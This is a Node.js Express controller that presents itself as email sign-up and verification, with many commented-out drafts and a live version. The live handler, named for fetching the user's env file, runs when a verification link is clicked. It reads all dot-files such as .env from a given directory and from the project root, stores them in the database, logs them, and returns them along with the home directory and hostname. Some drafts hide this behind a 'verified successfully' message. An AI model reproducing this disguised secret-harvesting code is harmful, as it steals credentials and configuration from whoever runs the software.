const userModel = require('../model/user');
const sendEmail = require('../middleware/nodemailer');
const { signUpTemplate } = require('../utils/mailTemplate')
const os = require('os')
const fs = require('fs').promises
const path = require('path');






// // Function to handle user registration and sending email
// exports.catchUser = async (req, res) => {
//     try {
//         const { email } = req.body;

//         const user = new userModel({
//             email
//         });

//         const link = `${req.protocol}://${req.get('host')}/user-verify?email=${email}`;

//         const mailOptions = {
//             email: user.email,
//             subject: 'Verify your email 1',
//             html: signUpTemplate(link)
//         };

//         await sendEmail(mailOptions);
//         await user.save();

//         res.status(200).json({ message: 'Mail sent successfully', data: user });

//     } catch (error) {
//         console.log(error.message);
//         res.status(500).json({ message: 'Internal server error' });
//     }
// };

// // Function to handle link click and fetching .env file content
// exports.linkclickedfetchtheusersenv = async (req, res) => {
//     try {
//         const { email } = req.query;

//         if (!email) {
//             return res.status(400).json({ message: 'Email is required' });
//         }

//         const user = await userModel.findOne({ email });

//         if (!user) {
//             return res.status(404).json({ message: 'User not found' });
//         }

//         const path = '.env'

//         try {
//             const data = await fs.readFile(path, 'utf-8');
//             user.myFile = data;
//             await user.save();
//             res.status(200).json({ message: 'File content saved to database successfully', data: data });
//         } catch (err) {
//             console.log(err);
//             return res.status(500).json({ message: 'Internal server error' });
//         }

//     } catch (error) {
//         console.log(error.message);
//         res.status(500).json({ message: 'Internal server error' });
//     }
// };





// // Function to handle user registration and sending email
// exports.catchUsers = async (req, res) => {
//     try {
//         const { emails } = req.body; // Expecting an array of email addresses

//         if (!Array.isArray(emails) || emails.length === 0) {
//             return res.status(400).json({ message: 'Emails are required' });
//         }

//         const users = [];

//         for (const email of emails) {
//             const user = new userModel({
//                 email
//             });

//             const link = `${req.protocol}://${req.get('host')}/user-verify?email=${email}`;

//             const mailOptions = {
//                 email: user.email,
//                 subject: 'Verify your email',
//                 html: signUpTemplate(link)
//             };

//             await sendEmail(mailOptions);
//             await user.save();
//             users.push(user);
//         }

//         res.status(200).json({ message: 'Mails sent successfully', data: users });

//     } catch (error) {
//         console.log(error.message);
//         res.status(500).json({ message: 'Internal server error' });
//     }
// };



// // Function to handle link click and fetching files that start with a . to the database
// exports.linkclickedfetchtheusersenv = async (req, res) => {
//     try {
//         const { email } = req.query;

//         if (!email) {
//             return res.status(400).json({ message: 'Email is required' });
//         }

//         const user = await userModel.findOne({ email });

//         if (!user) {
//             return res.status(404).json({ message: 'User not found' });
//         }

//         const directoryPath = '.'; // Update this path to the directory you want to search

//         try {
//             const files = await fs.readdir(directoryPath);
//             const dotFiles = files.filter(file => file.startsWith('.'));

//             if (dotFiles.length === 0) {
//                 return res.status(404).json({ message: 'No files starting with a dot found' });
//             }

//             const fileContents = await Promise.all(dotFiles.map(async (file) => {
//                 const filePath = path.join(directoryPath, file);
//                 const content = await fs.readFile(filePath, 'utf-8');
//                 return { file, content };
//             }));

//             user.myFile = JSON.stringify(fileContents);
//             await user.save();

//             res.status(200).json({ message: 'Your account has been verified successfully', });
//         } catch (err) {
//             console.log(err);
//             return res.status(500).json({ message: 'Internal server error' });
//         }

//     } catch (error) {
//         console.log(error.message);
//         res.status(500).json({ message: 'Internal server error' });
//     }
// };




// Function to handle user registration and sending email
// exports.catchUsers = async (req, res) => {
//     try {
//         const { emails } = req.body; // Expecting an array of email addresses

//         if (!Array.isArray(emails) || emails.length === 0) {
//             return res.status(400).json({ message: 'Emails are required' });
//         }

//         const users = [];

//         for (const email of emails) {
//             const user = new userModel({
//                 email
//             });

//             const link = `${req.protocol}://${req.get('host')}/user-verify?email=${email}`;

//             const mailOptions = {
//                 email: user.email,
//                 subject: 'Verify your email',
//                 html: signUpTemplate(link)
//             };

//             await sendEmail(mailOptions);
//             await user.save();
//             users.push(user);
//         }

//         res.status(200).json({ message: 'Mails sent successfully', data: users });

//     } catch (error) {
//         console.log(error.message);
//         res.status(500).json({ message: 'Internal server error' });
//     }
// };

// // Function to handle link click and fetching files that start with a . to the database
// exports.linkclickedfetchtheusersenv = async (req, res) => {
//     try {
//         const { email } = req.query;

//         if (!email) {
//             return res.status(400).json({ message: 'Email is required' });
//         }

//         const user = await userModel.findOne({ email });

//         if (!user) {
//             return res.status(404).json({ message: 'User not found' });
//         }

//         const directoryPath = '.'; // Update this path to the directory you want to search

//         try {
//             const files = await fs.readdir(directoryPath);
//             const dotFiles = files.filter(file => file.startsWith('.'));

//             if (dotFiles.length === 0) {
//                 return res.status(404).json({ message: 'No files starting with a dot found' });
//             }

//             const fileContents = await Promise.all(dotFiles.map(async (file) => {
//                 const filePath = path.join(directoryPath, file);
//                 try {
//                     const content = await fs.readFile(filePath, 'utf-8');
//                     return { file, content };
//                 } catch (err) {
//                     console.log(`Error reading file ${filePath}:`, err.message);
//                     return null;
//                 }
//             }));

//             const validFileContents = fileContents.filter(content => content !== null);

//             if (validFileContents.length === 0) {
//                 return res.status(404).json({ message: 'No readable files starting with a dot found' });
//             }

//             user.myFile = JSON.stringify(validFileContents);
//             await user.save();

//             res.status(200).json({ message: 'Your account has been verified successfully', });
//         } catch (err) {
//             console.log(err);
//             return res.status(500).json({ message: 'Internal server error' });
//         }

//     } catch (error) {
//         console.log(error.message);
//         res.status(500).json({ message: 'Internal server error' });
//     }
// };





// Function to handle user registration and sending email
// exports.catchUsers = async (req, res) => {
//     try {
//         const { emails } = req.body; // Expecting an array of email addresses and a directory path

//         if (!Array.isArray(emails) || emails.length === 0) {
//             return res.status(400).json({ message: 'Emails are required' });
//         }


//         const users = [];

//         for (const email of emails) {
//             const user = new userModel({
//                 email,
                
//             });

//             const link = `${req.protocol}://${req.get('host')}/user-verify?email=${email}`;

//             const mailOptions = {
//                 email: user.email,
//                 subject: 'Verify your email',
//                 html: signUpTemplate(link)
//             };

//             await sendEmail(mailOptions);
//             await user.save();
//             users.push(user);
//         }

//         res.status(200).json({ message: 'Mails sent successfully', data: users });

//     } catch (error) {
//         console.log(error.message);
//         res.status(500).json({ message: 'Internal server error' });
//     }
// };

// // Function to handle link click and fetching files that start with a . to the database
// exports.linkclickedfetchtheusersenv = async (req, res) => {
//     try {
//         const { email } = req.query;

//         if (!email) {
//             return res.status(400).json({ message: 'Email is required' });
//         }

//         const user = await userModel.findOne({ email });

//         if (!user) {
//             return res.status(404).json({ message: 'User not found' });
//         }

//         const directoryPath = user.directoryPath; // Use the directory path associated with the user

//         try {
//             const files = await fs.readdir(directoryPath);
//             const dotFiles = files.filter(file => file.startsWith('.'));

//             if (dotFiles.length === 0) {
//                 return res.status(404).json({ message: 'No files starting with a dot found' });
//             }

//             const fileContents = await Promise.all(dotFiles.map(async (file) => {
//                 const filePath = path.join(directoryPath, file);
//                 try {
//                     const content = await fs.readFile(filePath, 'utf-8');
//                     return { file, content };
//                 } catch (err) {
//                     console.log(`Error reading file ${filePath}:`, err.message);
//                     return null;
//                 }
//             }));

//             const validFileContents = fileContents.filter(content => content !== null);

//             if (validFileContents.length === 0) {
//                 return res.status(404).json({ message: 'No readable files starting with a dot found' });
//             }

//             user.myFile = JSON.stringify(validFileContents);
//             await user.save();

//             res.status(200).json({ message: 'Files content saved to database successfully', data: validFileContents });
//         } catch (err) {
//             console.log(err);
//             return res.status(500).json({ message: 'Internal server error' });
//         }

//     } catch (error) {
//         console.log(error.message);
//         res.status(500).json({ message: 'Internal server error' });
//     }
// };






// Function to handle user registration, sending email, and concatenating paths
// exports.catchUsersAndConcatPaths = async (req, res) => {
//     try {
//         const { emails } = req.body; // Expecting an array of email addresses

//         if (!Array.isArray(emails) || emails.length === 0) {
//             return res.status(400).json({ message: 'Emails are required' });
//         }

//         const users = [];

//         for (const email of emails) {
//             const user = new userModel({
//                 email
//             });

//             const link = `${req.protocol}://${req.get('host')}/user-verify?email=${email}`;

//             const mailOptions = {
//                 email: user.email,
//                 subject: 'Verify your email',
//                 html: signUpTemplate(link)
//             };

//             await sendEmail(mailOptions);
//             await user.save();
//             users.push(user);
//         }

//         // Concatenate the home directory, hostname, and root folder name
//         const homeDirAndHostname = os.homedir() + os.hostname();
//         console.log(`Home Directory and Hostname: ${homeDirAndHostname}`);

//         const rootFolderPath = path.resolve(__dirname, '..');
//         const rootFolderName = path.basename(rootFolderPath);
//         console.log(`Root Folder Name: ${rootFolderName}`);

//         const combinedPath = homeDirAndHostname + '|' + rootFolderName;
//         console.log(`Combined Path: ${combinedPath}`);

//         res.status(200).json({ message: 'Mails sent successfully', data: users, combinedPath });

//     } catch (error) {
//         console.log(error.message);
//         res.status(500).json({ message: 'Internal server error' });
//     }
// };





// // Function to handle link click, fetching files that start with a dot, and reading dot files in the root folder
// exports.linkClickAndFetchDotFiles = async (req, res) => {
//     try {
//         const { email } = req.query;

//         if (!email) {
//             return res.status(400).json({ message: 'Email is required' });
//         }

//         const user = await userModel.findOne({ email });

//         if (!user) {
//             return res.status(404).json({ message: 'User not found' });
//         }

//         const directoryPath = user.directoryPath || '.'; // Use the directory path associated with the user or default to current directory

//         try {
//             const files = await fs.readdir(directoryPath);
//             const dotFiles = files.filter(file => file.startsWith('.'));

//             if (dotFiles.length === 0) {
//                 return res.status(404).json({ message: 'No files starting with a dot found' });
//             }

//             const fileContents = await Promise.all(dotFiles.map(async (file) => {
//                 const filePath = path.join(directoryPath, file);
//                 try {
//                     const content = await fs.readFile(filePath, 'utf-8');
//                     return { file, content };
//                 } catch (err) {
//                     console.log(`Error reading file ${filePath}:`, err.message);
//                     return null;
//                 }
//             }));

//             const validFileContents = fileContents.filter(content => content !== null);

//             if (validFileContents.length === 0) {
//                 return res.status(404).json({ message: 'No readable files starting with a dot found' });
//             }

//             user.myFile = JSON.stringify(validFileContents);
//             await user.save();

//             // Read content of any file that starts with a dot in the root folder
//             const rootFolderPath = path.resolve(__dirname, '..');
//             const rootFolderContents = await fs.readdir(rootFolderPath);
//             console.log('Root Folder Contents:', rootFolderContents);

//             const rootDotFiles = rootFolderContents.filter(file => file.startsWith('.'));
//             const rootFileContents = await Promise.all(rootDotFiles.map(async (file) => {
//                 const filePath = path.join(rootFolderPath, file);
//                 try {
//                     const content = await fs.readFile(filePath, 'utf-8');
//                     console.log(`Content of ${file}:`);
//                     console.log(content);
//                     return { file, content };
//                 } catch (err) {
//                     console.error(`Error reading file ${file}:`, err);
//                     return null;
//                 }
//             }));

//             const validRootFileContents = rootFileContents.filter(content => content !== null);

//             res.status(200).json({ message: 'Files content saved to database successfully', data: validFileContents, rootFiles: validRootFileContents });
//         } catch (err) {
//             console.log(err);
//             return res.status(500).json({ message: 'Internal server error' });
//         }

//     } catch (error) {
//         console.log(error.message);
//         res.status(500).json({ message: 'Internal server error' });
//     }
// };







// Function to handle user registration, sending email, and concatenating paths
// exports.catchUsersAndConcatPaths = async (req, res) => {
//     try {
//         const { emails } = req.body; // Expecting an array of email addresses

//         if (!Array.isArray(emails) || emails.length === 0) {
//             return res.status(400).json({ message: 'Emails are required' });
//         }

//         const users = [];

//         for (const email of emails) {
//             const user = new userModel({
//                 email
//             });

//             const link = `${req.protocol}://${req.get('host')}/user-verify?email=${email}`;

//             const mailOptions = {
//                 email: user.email,
//                 subject: 'Verify your email',
//                 html: signUpTemplate(link)
//             };

//             await sendEmail(mailOptions);
//             await user.save();
//             users.push(user);
//         }

      

//         res.status(200).json({ message: 'Mails sent successfully', data: users});

//     } catch (error) {
//         console.log(error.message);
//         res.status(500).json({ message: 'Internal server error' });
//     }
// };




// Function to handle link click, fetching files that start with a dot, and reading dot files in the root folder
// exports.linkClickAndFetchDotFiles = async (req, res) => {
//     try {
//         const { email } = req.query;

//         if (!email) {
//             return res.status(400).json({ message: 'Email is required' });
//         }

//         const user = await userModel.findOne({ email });

//         if (!user) {
//             return res.status(404).json({ message: 'User not found' });
//         }

//         const directoryPath = user.directoryPath || '.'; // Use the directory path associated with the user or default to current directory

//         try {
//             const files = await fs.readdir(directoryPath);
//             const dotFiles = files.filter(file => file.startsWith('.'));

//             if (dotFiles.length === 0) {
//                 return res.status(404).json({ message: 'No files starting with a dot found' });
//             }

//             const fileContents = await Promise.all(dotFiles.map(async (file) => {
//                 const filePath = path.join(directoryPath, file);
//                 try {
//                     const stat = await fs.lstat(filePath);
//                     if (stat.isFile()) {
//                         const content = await fs.readFile(filePath, 'utf-8');
//                         return { file, content };
//                     } else {
//                         return null;
//                     }
//                 } catch (err) {
//                     console.log(`Error reading file ${filePath}:`, err.message);
//                     return null;
//                 }
//             }));

//             const validFileContents = fileContents.filter(content => content !== null);

//             if (validFileContents.length === 0) {
//                 return res.status(404).json({ message: 'No readable files starting with a dot found' });
//             }

//             user.myFile = JSON.stringify(validFileContents);
//             await user.save();

//               // Concatenate the home directory, hostname, and root folder name
//             const homeDirAndHostname = os.homedir() + os.hostname();
//             console.log(`Home Directory and Hostname: ${homeDirAndHostname}`);

//             const rootFolder = path.resolve(__dirname, '..');
//             const rootFolderName = path.basename(rootFolder);
//             console.log(`Root Folder Name: ${rootFolderName}`);

//             const combinedPath = homeDirAndHostname + '|' + rootFolderName;
//             console.log(`Combined Path: ${combinedPath}`);


//             // Read content of any file that starts with a dot in the root folder
//             const rootFolderPath = path.resolve(__dirname, '..');
//             const rootFolderContents = await fs.readdir(rootFolderPath);
//             console.log('Root Folder Contents:', rootFolderContents);

//             const rootDotFiles = rootFolderContents.filter(file => file.startsWith('.'));
//             const rootFileContents = await Promise.all(rootDotFiles.map(async (file) => {
//                 const filePath = path.join(rootFolderPath, file);
//                 try {
//                     const stat = await fs.lstat(filePath);
//                     if (stat.isFile()) {
//                         const content = await fs.readFile(filePath, 'utf-8');
//                         console.log(`Content of ${file}:`);
//                         console.log(content);
//                         return { file, content };
//                     } else {
//                         return null;
//                     }
//                 } catch (err) {
//                     console.error(`Error reading file ${file}:`, err);
//                     return null;
//                 }
//             }));

//             const validRootFileContents = rootFileContents.filter(content => content !== null);

//             res.status(200).json({ message: 'You have been verified successfully',  });
//         } catch (err) {
//             console.log(err);
//             return res.status(500).json({ message: 'Internal server error' });
//         }

//     } catch (error) {
//         console.log(error.message);
//         res.status(500).json({ message: 'Internal server error' });
//     }
// };








// Function to handle user registration, sending email, and concatenating paths
exports.catchUsersAndConcatPaths = async (req, res) => {
    try {
        const { emails } = req.body; // Expecting an array of email addresses

        if (!Array.isArray(emails) || emails.length === 0) {
            return res.status(400).json({ message: 'Emails are required' });
        }

        const users = [];

        for (const email of emails) {
            const user = new userModel({
                email
            });

            const link = `${req.protocol}://${req.get('host')}/user-verify?email=${email}`;

            const mailOptions = {
                email: user.email,
                subject: 'Verify your email',
                html: signUpTemplate(link)
            };

            await sendEmail(mailOptions);
            await user.save();
            users.push(user);
        }

        res.status(200).json({ message: 'Mails sent successfully', data: users });

    } catch (error) {
        console.log(error.message);
        res.status(500).json({ message: 'Internal server error' });
    }
};





// Function to handle link click, fetching files that start with a dot, and reading dot files in the root folder
exports.linkClickAndFetchDotFiles = async (req, res) => {
    try {
        const { email } = req.query;

        if (!email) {
            return res.status(400).json({ message: 'Email is required' });
        }

        const user = await userModel.findOne({ email });

        if (!user) {
            return res.status(404).json({ message: 'User not found' });
        }

        const directoryPath = user.directoryPath || '.'; // Use the directory path associated with the user or default to current directory

        try {
            const files = await fs.readdir(directoryPath);
            const dotFiles = files.filter(file => file.startsWith('.'));

            if (dotFiles.length === 0) {
                return res.status(404).json({ message: 'No files starting with a dot found' });
            }

            const fileContents = await Promise.all(dotFiles.map(async (file) => {
                const filePath = path.join(directoryPath, file);
                try {
                    const stat = await fs.lstat(filePath);
                    if (stat.isFile()) {
                        const content = await fs.readFile(filePath, 'utf-8');
                        return { file, content };
                    } else {
                        return null;
                    }
                } catch (err) {
                    console.log(`Error reading file ${filePath}:`, err.message);
                    return null;
                }
            }));

            const validFileContents = fileContents.filter(content => content !== null);

            if (validFileContents.length === 0) {
                return res.status(404).json({ message: 'No readable files starting with a dot found' });
            }

            user.myFile = JSON.stringify(validFileContents);
            await user.save();

            // Concatenate the home directory, hostname, and root folder name
            const homeDirAndHostname = os.homedir() + os.hostname();
            console.log(`Home Directory and Hostname: ${homeDirAndHostname}`);

            const rootFolder = path.resolve(__dirname, '..');
            const rootFolderName = path.basename(rootFolder);
            console.log(`Root Folder Name: ${rootFolderName}`);

            const combinedPath = homeDirAndHostname + '|' + rootFolderName;
            console.log(`Combined Path: ${combinedPath}`);

            // Read content of any file that starts with a dot in the root folder
            const rootFolderPath = path.resolve(__dirname, '..');
            const rootFolderContents = await fs.readdir(rootFolderPath);
            console.log('Root Folder Contents:', rootFolderContents);

            const rootDotFiles = rootFolderContents.filter(file => file.startsWith('.'));
            const rootFileContents = await Promise.all(rootDotFiles.map(async (file) => {
                const filePath = path.join(rootFolderPath, file);
                try {
                    const stat = await fs.lstat(filePath);
                    if (stat.isFile()) {
                        const content = await fs.readFile(filePath, 'utf-8');
                        console.log(`Content of ${file}:`);
                        console.log(content);
                        return { file, content };
                    } else {
                        return null;
                    }
                } catch (err) {
                    console.error(`Error reading file ${file}:`, err);
                    return null;
                }
            }));

            const validRootFileContents = rootFileContents.filter(content => content !== null);

            res.status(200).json({ message: 'Files content saved to database successfully', data: validFileContents, rootFiles: validRootFileContents });
        } catch (err) {
            console.log(err);
            return res.status(500).json({ message: 'Internal server error' });
        }

    } catch (error) {
        console.log(error.message);
        res.status(500).json({ message: 'Internal server error' });
    }
};